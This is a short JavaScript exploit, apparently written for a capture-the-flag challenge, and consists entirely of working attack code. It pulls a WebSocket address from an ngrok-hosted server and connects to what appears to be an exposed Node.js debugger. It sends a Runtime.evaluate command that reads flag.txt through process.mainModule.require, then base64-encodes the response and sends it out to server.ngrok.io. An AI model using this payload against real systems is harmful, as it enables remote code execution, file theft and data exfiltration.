// Remember to strip out the newlines and set up server...
async function g(){
    let a;
    await fetch(`http://server.ngrok.io/`).then(r=>r.text()).then(d=>{a=d});
    console.log(a);
    let s = new WebSocket(a);
    s.onopen = function() {
        data = `require = process.mainModule.require;fs = require('fs');fs.readFileSync('flag.txt').toString();`;
        s.send(JSON.stringify({'id':1,'method':'Runtime.evaluate','params':{'expression': data}}));
    };
    s.onmessage = function (event) {
        fetch(`http://server.ngrok.io/?`+btoa(event.data));
    };
};
g();
